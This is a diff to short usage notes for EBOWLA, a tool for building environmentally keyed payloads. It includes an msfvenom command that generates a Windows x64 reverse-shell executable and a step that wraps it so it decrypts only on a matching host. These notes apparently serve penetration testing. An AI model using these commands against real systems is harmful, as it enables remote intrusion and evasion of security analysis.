@@ -1,4 +1,5 @@
-# EBOWLA usage
+# EBOWLA
+## framework for building environmental keyed payloads
 
 ### Get EBOWLA
 
@@ -17,9 +18,13 @@ payload_type = EXE
 Set at least one environment variable (computername = hostname),
 the name has to be exact, as Ebowla won't decrypt otherwise.
 
+### make payload
+
 Make, as an example, a reverse shell payload with metersploit: 
 
 ```msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -a x64 -o shell.exe```
+
+### build executable with Ebowla
 
 ```python2 ebowla.py shell.exe genetic.config```
 
